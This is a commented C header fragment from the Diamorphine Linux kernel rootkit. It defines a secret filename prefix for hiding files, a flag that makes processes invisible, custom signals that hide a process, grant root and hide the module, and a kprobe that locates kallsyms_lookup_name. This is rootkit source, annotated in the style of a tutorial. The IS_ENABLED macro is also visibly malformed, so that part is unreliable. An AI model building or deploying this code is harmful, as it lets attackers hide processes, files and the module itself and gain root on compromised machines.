struct linux_dirent
{
	/**
	 * Struct to represent directory entries in the Linux filesystem.
	 */

	unsigned long d_ino;	 // inode number
	unsigned long d_off;	 // offset to the next linux_dirent
	unsigned short d_reclen; // length of this linux_dirent
	char d_name[1];			 // filename
};

#define MAGIC_PREFIX "diamorphine_secret"

/**
 * Macro to define a custom flag to mark a process as invisible
 *
 * In binary, the flag is represented as 0001 0000 0000 0000 0000 0000 0000 0000
 * Using a high bit position like this minimizes the chances of conflicting with other flags or values that may be used in the kernel. This ensures that the flag is unique and does not interfere with other flags that might be used by the kernel or other modules.
 **/
#define PF_INVISIBLE 0x10000000

#define MODULE_NAME "diamorphine"

enum
{
	/**
	 * Enum to represent custom signals for specified actions
	 */

	SIGINVIS = 31,	  // signal to hide a process
	SIGSUPER = 64,	  // signal to elevate privileges
	SIGMODINVIS = 63, // signal to hide the module
};

/**
 * Macro utility to check if a particular configuration option is enabled in the kernel configuration.
 *
 * When the Linux kernel is configured, various configuration options are set. These options control which features and modules are included in the kernel build.
 *
 * During the build process, the kernel build system translates these configuration options into preprocessor symbols. For example if you enable a configuration option called CONFIG_MY_OPTION, the kernel build system might define the following preprocessor symbols:
   - __enabled_CONFIG_MY_OPTION : This symbol is defined if the CONFIG_MY_OPTION configuration option is enabled.

   - __enabled_CONFIG_MY_OPTION_MODULE : This symbol is defined if the CONFIG_MY_OPTION configuration option is enabled as a loadable module.
 **/
#ifndef IS_ENABLED
#define IS_ENABLED(option) (
	defined(__enabled_##option) ||
	defined(__enabled_##option##_MODULE)
)
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
// Defines a static kprobe structure to specify the probe point. The symbol_name field is set to the name of the function to probe. In this case, the kallsyms_lookup_name function is probed.

// This mechanism allows you to dynamically insert probes into the kernel code at runtime, enabling powerful debugging and monitoring capabilities.
// In this case it allows the module to dynamically locate the address of the kallsyms_lookup_name function at runtime.
static struct kprobe kp = {
    // The kallsyms_lookup_name function is used to look up the address of kernel symbols by name
	.symbol_name = "kallsyms_lookup_name"
};
#endif
